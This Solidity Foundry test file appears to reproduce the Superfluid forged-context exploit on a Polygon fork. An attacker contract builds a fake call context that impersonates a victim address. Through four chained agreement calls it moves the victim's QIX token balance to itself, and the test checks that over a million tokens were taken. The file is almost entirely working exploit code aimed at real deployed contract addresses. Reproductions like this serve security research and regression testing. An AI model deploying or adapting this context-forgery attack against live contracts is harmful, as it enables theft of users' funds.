// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface ISuperfluidToken {}

interface ISuperToken is ISuperfluidToken, IERC20 {}

interface ISuperAgreement {}

interface ISuperfluid {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);
}

interface IInstantDistributionAgreement is ISuperAgreement {
    function createIndex(ISuperfluidToken token, uint32 indexId, bytes calldata ctx) external returns (bytes memory);
    function updateSubscription(
        ISuperfluidToken token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx
    ) external returns (bytes memory);
    function updateIndex(
        ISuperfluidToken token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx
    ) external returns (bytes memory);
    function claim(
        ISuperfluidToken token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory);
}

contract SuperfluidAttacker {
    ISuperfluid private constant SUPERFLUID = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    IInstantDistributionAgreement private constant IDA =
        IInstantDistributionAgreement(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
    ISuperToken private constant QIX = ISuperToken(0xe1cA10e6a10c0F72B74dF6b7339912BaBfB1f8B5);
    address private constant VICTIM = 0x5073c1535A1a238E7c7438c553F1a2BaAC366cEE;
    uint32 private constant INDEX_ID = 98_789;

    function attack() external {
        bytes memory fakeCtx = abi.encode(
            abi.encode(0, 0, VICTIM, bytes4(0), new bytes(0)),
            abi.encode(0, 0, address(0), address(0))
        );

        // The host replaces only a placeholder ctx. A zero-length placeholder plus
        // trailing zeroes bypasses that check, while ABI decoding keeps this forged ctx.
        SUPERFLUID.callAgreement(
            IDA, abi.encodeWithSelector(IDA.createIndex.selector, QIX, INDEX_ID, fakeCtx), "0x"
        );
        SUPERFLUID.callAgreement(
            IDA,
            abi.encodeWithSelector(
                IDA.updateSubscription.selector, QIX, INDEX_ID, address(this), QIX.balanceOf(VICTIM), fakeCtx
            ),
            "0x"
        );
        SUPERFLUID.callAgreement(
            IDA, abi.encodeWithSelector(IDA.updateIndex.selector, QIX, INDEX_ID, uint128(1), fakeCtx), "0x"
        );
        SUPERFLUID.callAgreement(
            IDA, abi.encodeWithSelector(IDA.claim.selector, QIX, VICTIM, INDEX_ID, address(this), new bytes(0)), "0x"
        );
    }
}

contract SuperfluidExploitTest is Test {
    IERC20 private constant QIX = IERC20(0xe1cA10e6a10c0F72B74dF6b7339912BaBfB1f8B5);

    function testExploit() public {
        vm.createSelectFork("https://polygon.drpc.org", 24_684_713);
        SuperfluidAttacker attacker = new SuperfluidAttacker();

        attacker.attack();

        assertGt(QIX.balanceOf(address(attacker)), 1_000_000 ether);
    }
}
